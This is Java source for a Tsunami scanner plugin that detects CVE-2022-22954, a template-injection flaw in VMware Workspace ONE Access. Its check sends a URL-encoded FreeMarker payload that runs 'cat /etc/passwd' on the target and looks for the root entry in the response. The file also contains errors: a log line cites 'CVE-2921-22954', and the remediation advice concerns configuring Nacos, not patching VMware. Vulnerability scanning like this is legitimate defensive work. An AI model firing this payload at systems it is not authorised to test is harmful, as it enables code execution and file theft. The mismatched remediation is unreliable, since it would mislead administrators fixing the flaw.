/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202222954;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-22954 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202222954VulnDetector",
    version = "0.1",
    description =
        "VMware Workspace ONE Access and Identity Manager contain a remote code execution "
            + "vulnerability due to server-side template injection. A malicious actor with network "
            + "access can trigger a server-side template injection that may result in remote code "
            + "execution. ",
    author = "hh-hunter",
    bootstrapModule = Cve202222954DetectorBootstrapModule.class)
public final class Cve202222954VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String CHECK_VUL_PATH =
      "catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker%2Etemplate%2Eutility"
          + "%2EExecute%22%3Fnew%28%29%28%22cat%20%2Fetc%2Fpasswd%22%29%7D";

  @VisibleForTesting static final Pattern DETECTION_PATTERN = Pattern.compile("root:[x*]:0:0");

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "An unauthenticated attacker with network access could exploit this vulnerability by sending "
          + "a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. "
          + "Successful exploitation could result in remote code execution by exploiting a "
          + "server-side template injection flaw";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202222954VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2921-22954 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = buildTargetUrl(networkService);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetUri)
                  .setHeaders(HttpHeaders.builder().build())
                  .build(),
              networkService);
      if (httpResponse.status().code() == 400
          && DETECTION_PATTERN.matcher(httpResponse.bodyString().get()).find()) {
        return true;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-22954"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2022-22954 VMware Workspace ONE Access - Freemarker SSTI")
                .setRecommendation(
                    "Configure nacos.core.auth.enabled to true, upgrade nacos to the latest"
                        + " version, configure custom authentication key-value pair information")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }

